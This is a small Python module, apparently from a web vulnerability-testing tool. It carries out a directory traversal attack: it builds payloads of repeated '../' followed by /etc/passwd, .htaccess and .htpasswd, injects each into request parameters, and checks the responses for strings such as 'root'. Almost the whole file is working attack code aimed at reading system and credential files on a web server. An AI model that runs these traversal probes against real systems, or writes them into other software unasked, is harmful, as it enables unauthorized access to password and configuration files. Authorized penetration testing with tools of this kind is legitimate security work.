#!/usr/local/bin/python3.5

"""
This script provides directory traversal functionality.
Is a naive scrips that generates directory traversal paths.
NOTE: unix only
"""


import requests

from modules.http import execute_request
from modules.logger import cprint


dots = "../"
common_files = ["/etc/passwd",".htaccess",".htpasswd"]
common_check = ["root","boh","boh2"]

"""
Executes directory traversal attack
"""
def execute_traversal(s,request,check,fname=common_files):
    cprint("Executing directory traversal attack","V")
    params = request["params"]
    payloads = __payloadgenerator(fname)
    for park, parv in params.items():
        if parv == "?":
            for p in payloads: 
                params[park] = p
                cprint("trying: "+p)
                r = execute_request(s,request)
                if check in r.text:
                    return True
    return False
            


"""
Given a filename, this function returns a list of payloads that needs to be tested for performin
a directory traversal attack.
"""
def __payloadgenerator(fnames,depth=6):
    return [dots*i+f for i in range(depth) for f in fnames]
